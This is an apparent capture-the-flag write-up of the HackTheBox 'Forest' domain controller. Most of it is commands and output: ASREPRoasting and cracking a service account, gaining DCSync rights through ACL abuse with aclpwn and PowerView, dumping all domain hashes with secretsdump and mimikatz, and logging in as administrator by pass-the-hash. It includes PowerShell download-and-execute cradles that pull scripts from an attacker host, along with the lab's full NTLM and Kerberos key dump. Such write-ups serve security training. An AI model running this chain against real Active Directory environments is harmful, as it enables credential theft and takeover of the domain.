## Forest DC box ,  ASREPRoast exploit for user and DCsYNC attack for root

This box is a DC windows machine, and i learned a lot about DC. 

Firstly we can see that we have Ldap/Kerbereos/smb ..
And i used enum4Linux script and i  caught many users, the last step for me was to find a password for one of theses usernames, but with hydra i had nothing.

Bruteforce smb with hydra try first all theses usernames with blank password and also with the username as password but dosen't work :

```
$ hydra -L users.txt -P users.txt  10.10.10.161 smb 
$ hydra -L users.txt -p ""  10.10.10.161 smb 
```

So with some research about dc , and how to exploit kerberos and extract a hash for a user : this vuln called "ASREPRoast"

URL:  http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/

Impacket has a good tool for that: GetNPUsers.py ( we can use it without password)

Test all users caught before like :

```
$ cat users.txt
$331000-VK4ADACQNUCA
$D31000-NSEL5BRJ63V7
Administrator
DefaultAccount
EXCH01$
Exchange Servers
Exchange Trusted Subsystem
FOREST$
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxfd87238
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
Service Accounts
andy
krbtgt
lucinda
mark
santi
sebastien
svc-alfresco
```
```
$ for user in $(cat users.txt); do GetNPUsers.py   -dc-ip 10.10.10.161 HTB/$user -no-pass ; done
...
....
[*] Getting TGT for svc-alfresco
Name          MemberOf                                                PasswordLastSet      LastLogon            UAC      
------------  ------------------------------------------------------  -------------------  -------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2019-10-14 20:14:31  2019-10-14 20:14:22  0x410200 

$krb5asrep$23$svc-alfresco@HTB:d6a48169969bc21fb5b57ad284781a52$2d801f43eabe7cbd836de6d971aac941ee0244fb01687ff333c34ec160908c72a8597b2e9235507269cd7370ee6f
771163a9e2555e0b8e5a44dbf36a6042632b098456e055904b9c622bde5528c4d69e466406df0dc9107a6a9a287efbc663988d41954b877bb548cf7f01e25e43969081ae80465d32e784a6fb5b934
915e1ec2c90ce73911c4cefa3d9fcdcdba157a11ff5b04eaed8ea183e188da1743c7733bf1fe00fff79726dc982575613719c45b94f4efba8fc13804dc25e5d2f7f26333073c1b28f39a73930509162bbfddf8ff0b059831cbd524bbd9539972e58ba86
```

kerberos cheat sheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

And finally the user "svc-alfresco" works, i save the hash, and crack it with john like :
```
$ john   --wordlist=rockyou.txt hashes.txt
....
...
s3rvice          ($krb5asrep$23$svc-alfresco@HTB)
```

And i can try theses creds like :

```
$ smbmap   -u svc-alfresco -ps3rvice  -H 10.10.10.161
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.161...
[+] IP: 10.10.10.161:445	Name: forest.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                                  NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	NETLOGON                                                READ ONLY
	SYSVOL                                                  READ ONLY

```
## User Shell :

For shell i used  winrm_simple.rb a simple ruby scipt to have a shell trought winrm. And i'm able to have a shell as "svc-alfresco"

### Priv Esca : 

#### Enumeration 
```
PS > Get-ADComputer -Filter *
DistinguishedName : CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
DNSHostName       : FOREST.htb.local
Enabled           : True
Name              : FOREST
ObjectClass       : computer
ObjectGUID        : 0b814a2b-18eb-4f6a-9449-3387cf40b27a
SamAccountName    : FOREST$
SID               : S-1-5-21-3072663084-364016917-1341370565-1000
UserPrincipalName : 

DistinguishedName : CN=EXCH01,CN=Computers,DC=htb,DC=local
DNSHostName       : EXCH01.htb.local
Enabled           : True
Name              : EXCH01
ObjectClass       : computer
ObjectGUID        : babfbb15-e032-4376-bd03-6f131e7cfd4c
SamAccountName    : EXCH01$
SID               : S-1-5-21-3072663084-364016917-1341370565-1103
UserPrincipalName : 
```
We are in a DC box so the first thing,is to search , if we have any weak in the DC users/group conf, which let us to escalate to the Domain.

For that, i used  BloodHound to have all the DC objects graph :  https://github.com/BloodHoundAD/BloodHound/releases/tag/2.0.5

This part was very long, because i had to find the right version of bloodhound which the powershell script "SharHound.ps1", will work without errors.

BloodHound is an app which draw a graph about any objects from the DC, also relationship between all Domain objects (users, groups etc ).

#### Nota : Stable Release version of BloodHound : version 2.0.5  

Create json files: 

Use "SharpHound.ps1" from  "BloodHound-version-release-2.0.5/resources/app/Ingestors/"

And from the victim we execute it with powershell like: 
```
$ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.x/SharpHound.ps1');invoke-bloodhound -collectionmethod all"
Initializing BloodHound at 5:04 PM on 10/17/2019
Resolved Collection Methods to Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM
Building GUID Cache
Starting Enumeration for htb.local
Waiting for enumeration threads to finish
EXCH01.HTB.LOCAL did not respond to ping
Status: 123 objects enumerated (+123 41/s --- Using 106 MB RAM )
Finished enumeration for htb.local in 00:00:03.5622425
1 hosts failed ping. 0 hosts timedout.
Waiting for writer thread to finish

Compressing data to C:\windows\system32\spool\drivers\color\20191017170426_BloodHound.zip.
You can upload this file directly to the UI.
Finished compressing files!
```

This will create a zip with all .json files.

##### Launch BloodHound:

Firsly we have to install (neo4j) if it's not already installed.
Start it like : 
```
$ sudo service neo4j start 
```
And from BloodHound-version-release-2.0.5/ , Launch : 
```
$ ./BloodHound
```
We have now to import all .json files and we can search any objects(User, Group, Domain ..)  with putting the name in the textArea.

##### AclPwn 

First install it like : sudo pip install aclpwn 

In this step, i would found a path to a priviliged group in this DC, for that i used a python tool, which search if we have a path to the domain, we can also see if we can escalate to a specific group or computer or user etc ..

AclPwn use the neo4j db, which contains all .json data ( we can remove all theses data from bloodHound app), and from it seach for any path to escalate a domain, we can just find the path locally without exploit using the param (-dry) like :

```
$ aclpwn -f  svc-alfresco@htb.local  -d htb.local  -sp s3rvice -dry  
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
Please choose a path [0-1] 0
[+] Path validated, the following modifications are required for exploitation in the current configuration:
[-] Adding user SVC-ALFRESCO to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
[-] Modifying domain DACL to give DCSync rights to SVC-ALFRESCO
```

This command verify if we have any path to exploit the domain with the user (svc-alfresco, and password)
Let's now do the same , but with exploit ( aclpwn will try to add the user to the group priviliged "TRUSTED SUBSYSTEM@HTB.LOCAL", and also give this user "DCSync" rights : 

```
$ aclpwn -f  svc-alfresco  -d  htb.local  -sp s3rvice -s 10.10.10.161        
Please supply the password or LM:NTLM hashes of the account you are escalating from: 
[+] Path found!
Path [0]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
[!] Unsupported operation: GetChanges on HTB.LOCAL (Domain)
[-] Invalid path, skipping
[!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
[-] Invalid path, skipping
[+] Path found!
Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-[WriteDacl]->(HTB.LOCAL)
Please choose a path [0-1] 0
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user svc-alfresco to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
[-] Could not add CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local to group CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local since they are already a member, your BloodHound data may be out of date, continuing anyway!
[-] Switching context to svc-alfresco
[+] Done switching context
[-] Memberof -> continue
[-] Modifying domain DACL to give DCSync rights to svc-alfresco
[+] Dacl modification successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191017-181438.restore
1) we can if we have a path to Exchange group , to use this exploit and (Modifying domain DACL to give DCSync rights to a use) (see links about this exploit)with aclpwn
```
##### DCSync attack : 

DCSync works by requesting account password data from a Domain Controller. It can also ask Domain Controllers to replicate information using the Directory Replication Service Remote Protocol. All this can be done without running any code on a Domain Controller unlike some of the other ways Mimikatz extracts password data. What's even worse this attack takes advantage of a valid and necessary function of Active Directory, meaning it cannot be turned off or disabled. This being said we must rely on detection.

#### Nota : When a user is part of a hight priviliged group, it can add the DCSync right.

So here aclpwn , add svc-alfresco user to a priviliged group "EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL" and add DCSync rights to it.

### Getting Credentials

From here i can dump all hashes from DC with an impacket tool like :
```
$ secretsdump.py     htb.local/svc-alfresco:s3rvice@forest.htb.local 
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:e486a6eb89593a31219608f2e1d29705:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:da885c62b099ffac9dddbba58bc07f15b536f3bfa6ef4966493318ebcc9fc199
FOREST$:aes128-cts-hmac-sha1-96:bad1659c1d23ae1a8b58466b3c246515
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```

### Pass the Hash(Pth) to have an admin shell 

In the last step, we can use pth-winexe and use it with the "LM:NTLM" hash of administrator like :
```
$ pth-winexe -U htb.local/administrator%aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6  //10.10.10.161 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\administrator

```
And voila.

## Let's try to escalate manually now : 

First with BloodHound  we can verify if we have a path to any priviliged group.
From output  as we can see below, we can escalate to the group "EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL" 

From the windows victim, and to perform DCSync attack, we firstly have to add the user to this group like :   
```
$ net group "EXCHANGE TRUSTED SUBSYSTEM" svc-alfresco /add
The command completed successfully.
```

We can also use an other hight privileged group like :
```
$ net group "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco /add
```
Or use aclpwn from our machine like : 
```
$ aclpwn -f  svc-alfresco@htb.local  -t "EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL"  -tt group  -s 10.10.10.161  -sp s3rvice
[+] Path found!
Path: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[MemberOf]->(PRIVILEGED IT ACCOUNTS@HTB.LOCAL)-[MemberOf]->(ACCOUNT OPERATORS@HTB.LOCAL)-[GenericAll]->(EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL)
[-] Memberof -> continue
[-] Memberof -> continue
[-] Memberof -> continue
[-] Adding user SVC-ALFRESCO to group EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL
[+] Added CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local as member to CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
[-] Re-binding to LDAP to refresh group memberships of SVC-ALFRESCO@HTB.LOCAL
[+] Re-bind successful
[+] Finished running tasks
[+] Saved restore state to aclpwn-20191021-021217.restore

```

We're now one of the "EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL"  group with hight priviliges.

```
PS > net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/17/2019 7:53:46 AM
Password expires             Never
Password changeable          10/18/2019 7:53:46 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/17/2019 7:54:11 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Exchange Trusted Subs
                             *Service Accounts     
The command completed successfully.
```

So we have to add "DCSync" right to the current user.

#### Nota: we have to relogin again or use RunAS to be able to use the new group added rights !!!
#### Nota: use the branch dev of PowerSPLOIT project 

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

```
$username = '.\svc-alfresco';$password = 's3rvice';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName FOREST -Command { cmd /k  ' C:\windows\system32\spool\drivers\color\dcs.bat ' }
```

Here we use RunAs and we execute a dcs.bat file which contains :

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.17/PowerView.ps1');Add-ObjectACL -PrincipalIdentity svc-alfresco -Rights DCSync" && C:\windows\system32\spool\drivers\color\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:administrator" exit
```

Here powershell import powerview.ps1 in the memory and add the "DCSync" like : Add-ObjectACL -PrincipalIdentity svc-alfresco -Rights DCSync
And finally use mimikatz.exe  to dump the hash of the user "ADMINISTRATOR"

```
.\mimikatz.exe "lsadump::dcsync /domain:htb.local /user:administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:htb.local /user:administrator
[DC] 'htb.local' will be the domain
[DC] 'FOREST.htb.local' will be the DC server
[DC] 'administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@htb.local
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 9/18/2019 10:09:08 AM
Object Security ID   : S-1-5-21-3072663084-364016917-1341370565-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 32693b11e6aa90eb43d32c72a07ceea6

mimikatz(commandline) # exit
```

Have the shell with crackmapexec using the NTLM hash from mimikatz:
```
$ crackmapexec 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 ```
#### Nota: 

mimikatz dump just the "NTLM" hash, so we have to use (crackmapexec or wmiexec).
secretsdump.py  dump "LM:NTLM"  hash, and we can use pth-wimexe tool to caught a shell. 

